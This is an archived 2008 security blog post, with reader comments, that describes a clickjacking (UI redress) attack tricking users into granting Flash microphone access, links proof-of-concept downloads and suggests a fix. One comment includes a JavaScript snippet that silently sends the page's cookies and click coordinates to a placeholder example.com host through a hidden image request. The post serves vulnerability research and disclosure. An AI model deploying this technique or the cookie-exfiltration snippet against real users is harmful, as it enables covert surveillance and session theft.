<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>More Advanced Clickjacking - UI Redress Attacks</title><meta name="description" content="This will be a quick post just to share some POCs and more information regarding the recent Clickjacking technique, i.e. UI Redress Attack, a name suggested by Michael Zalewski."><meta property="name" content="More Advanced Clickjacking - UI Redress Attacks"><meta itemprop="name" content="More Advanced Clickjacking - UI Redress Attacks"><meta property="description" content="This will be a quick post just to share some POCs and more information regarding the recent Clickjacking technique, i.e. UI Redress Attack, a name suggested by Michael Zalewski."><meta itemprop="description" content="This will be a quick post just to share some POCs and more information regarding the recent Clickjacking technique, i.e. UI Redress Attack, a name suggested by Michael Zalewski."><meta property="image" content="https://www.gnucitizen.org/files/2008/10/flash-redress-01-300x151.png &quot;Flash Redress 01&quot;"><meta itemprop="image" content="https://www.gnucitizen.org/files/2008/10/flash-redress-01-300x151.png &quot;Flash Redress 01&quot;"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/more-advanced-clickjacking-ui-redress-attacks/"><meta property="og:title" content="More Advanced Clickjacking - UI Redress Attacks"><meta property="og:description" content="This will be a quick post just to share some POCs and more information regarding the recent Clickjacking technique, i.e. UI Redress Attack, a name suggested by Michael Zalewski."><meta property="og:image" content="https://www.gnucitizen.org/files/2008/10/flash-redress-01-300x151.png &quot;Flash Redress 01&quot;"><meta name="twitter:title" content="More Advanced Clickjacking - UI Redress Attacks"><meta name="twitter:description" content="This will be a quick post just to share some POCs and more information regarding the recent Clickjacking technique, i.e. UI Redress Attack, a name suggested by Michael Zalewski."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://www.gnucitizen.org/files/2008/10/flash-redress-01-300x151.png &quot;Flash Redress 01&quot;"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">More Advanced Clickjacking - UI Redress Attacks</h1><div class="date">Wed, 08 Oct 2008 18:08:24 GMT</div><div class="author">by pdp</div><div id="post-content"><p>This will be a quick post just to share some POCs and more information regarding the recent <a href="/blog/clickjacking-and-flash/">Clickjacking</a> technique, i.e. UI Redress Attack, a name suggested by Michael Zalewski.</p>
<p>Clickjacking is an oldie but, a goodie. You can track the origin of the attack back at the beginning of this decade. Clickjacking is essentially the anti-CSRF killer. It is also the killer of Flash, AJAX (because AJAX apps are sometimes easier to clickjack, look at Google) and some other technologies. &quot;Clickjacking&quot; is perhaps not the perfect name to depict this class of attacks but it is a cool one.</p>
<p>The picture that you see in this post is basically a UI redress attack against Flash. It works flawlessly on Ubuntu with the latest Firefox, Flash and the latest NoScript with the applied fixes against the clickjacking technique, i.e. ClearClick. I do not know why it works but it works. Btw, the POC that you&#39;ve probably seen to circulate in the last couple of days does not work on my setup.</p>
<p>The attack depicted here is very, very simple. All I do is UI redressing an evil iframe with preloaded malicious Flash file. In order to do that I use blank, absolute positioned iframes. At the end I color the entire page with the same color the standard Flash security dialog is using for displaying security messages. As you can see the user cannot do anything else but to click the <code>allow</code> button, upon which the attacker will start surveying the sound of the room the victim currently occupies.</p>
<blockquote>
<p>The solution for Flash is very simple. Show pop-up dialogs just like the ones used by signed Java applets, but make them more informational. Keep in mind though, that this solution can be abused to create rather annoying situations.</p>
</blockquote>
<p><em>You can download my POCs from <a href="/files/2008/10/clickjacking-pocs.zip">here</a> and <a href="/files/2008/10/clickjacking-pocs2.zip">here</a>.</em></p>
<div class="screen">![Flash Redress 01](/files/2008/10/flash-redress-01-300x151.png "Flash Redress 01") ![Flash Redress 02](/files/2008/10/flash-redress-02-300x131.png "Flash Redress 02")</div>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/27a21572566e7cbb44e0d33ef6b0b6e1?s=256&amp;d=retro" alt="unwiredbrain"><span class="post-comment-author">unwiredbrain</span><div class="post-comment-content">Little point of interest: an attacker could be very interested in <strong>where</strong> the victim clicked.

I mean: placing the attack on multiple elements can give to the attacker informations about page "hot spots" i.e. where the people most commonly click, allowing them to profile a better attack, according to the user feedback.

Here's the code:
<pre><code>var request = "http://www.example.com/collectingDataScript.jpg?l=" 
        + escape(document.location) + "&amp;c=" + escape(document.cookie) + "&amp;x=" 
        + c.x + "&amp;y=" + c.y;

var clickLogger = document.createElement("img");
    clickLogger.setAttribute("style", "position:absolute;left:-9999px;width:0;height:0;");
    clickLogger.setAttribute("src", request);</code></pre>

If you're using Firebug, you'll see in the Net panel the requests the script makes.

Going a little further, in HTML 5 frames can send messages to each other [1], so there will be no more need to use a double click: the inline frame will only have to watch for messages from the hosting window!

[1] http://it.youtube.com/watch?v=xIxDJof7xxQ -- from 05:40 to 15:20</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/be3b138352dc100c9459e612b275b413?s=256&amp;d=retro" alt="mindcorrosive"><span class="post-comment-author">mindcorrosive</span><div class="post-comment-content">I never knew that it was *that* easy.. Though you could probably mask the suspicious Flash-UI "Allow" button with an UI element as well, for maximum user frustration..</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/a91d8b2df902bcca4415f304dc589ec3?s=256&amp;d=retro" alt="Mr.V"><span class="post-comment-author">Mr.V</span><div class="post-comment-content">I'm getting noscript's clicjacking warning every time I try to open google images :( help.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/93fbcd57493dcc4f89fe44b8484237fe?s=256&amp;d=retro" alt="gnucitizen reader"><span class="post-comment-author">gnucitizen reader</span><div class="post-comment-content">is it just me or any of your pocs are prepared to be functional?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">the pocs are fully functional. they have been verified by a few close friends. 

unwiredbrain, you are absolutely right. I could have made the event bubble but a POC is a POC and nothing more :)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/27a21572566e7cbb44e0d33ef6b0b6e1?s=256&amp;d=retro" alt="unwiredbrain"><span class="post-comment-author">unwiredbrain</span><div class="post-comment-content"><strong>pdp</strong>, yeah, my biggest interest was pointing out that in the next HTML specification things about clickjacking will be easier than ever to set up.

The <em>where-victim-clicked</em> stuff was my POC of your POC ;-) :-P</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2020 <a href=""></a>. All rights reserved.</p></footer></body></html>